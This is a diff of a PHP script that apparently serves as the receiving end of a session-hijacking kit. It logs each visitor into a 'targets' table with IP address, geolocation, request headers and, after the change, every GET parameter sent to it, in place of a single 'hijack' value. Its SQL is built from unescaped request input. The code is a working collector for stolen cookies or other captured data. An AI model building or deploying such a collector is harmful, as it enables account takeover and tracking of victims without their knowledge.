@@ -102,24 +102,29 @@ $obj = json_decode($json);
 
 $today = date("Y/m/d") ." at " . date("h:i:sa");
 
+/*
+*
+*
+*
+*/
+
+
+function magic_function($k, $v){
+       // Thank to Younes Eip for helping me for this
+       return $v . "=" . $k ;
+}
+
+$result = implode("\n", array_map('magic_function', $_GET ,array_keys($_GET)));
 
 /*
 * INSERT DEATAILS TO DB
 */
 
-if(isset($_GET['hijack'])) {
-   
-   $value = $_GET['hijack'];
-   $heads = $headers."\n\n\r-------\n\n\r"."hijack=".$value;
-   
-   $insert = "INSERT INTO `targets` (`ip`, `c_name`, `region`, `time`, `zip`, `c_code` ,`headers`) VALUES ('".$obj->ip."', '".$obj->country_name."',  '".$obj->region_name."', '".$today."' ,'".$obj->zip_code."', '".$obj->country_code."' ,'".$heads."')";
-   $mysq = mysqli_query($db_con ,$insert);
+$heap = $headers."\n\r-------\n\r"."</br>".$result."</br>";
+$insert = "INSERT INTO `targets` (`ip`, `c_name`, `region`, `time`, `zip`, `c_code` ,`headers`) VALUES ('".$obj->ip."', '".$obj->country_name."',  '".$obj->region_name."', '".$today."' ,'".$obj->zip_code."', '".$obj->country_code."' ,'".$heap."')";
+$mysq = mysqli_query($db_con ,$insert);
 
-} else {
-    $insert = "INSERT INTO `targets` (`ip`, `c_name`, `region`, `time`, `zip`, `c_code` ,`headers`) VALUES ('".$obj->ip."', '".$obj->country_name."',  '".$obj->region_name."', '".$today."' ,'".$obj->zip_code."', '".$obj->country_code."' ,'".$headers."')";
-   $mysq = mysqli_query($db_con ,$insert);
 
-}
 
 
 ?>
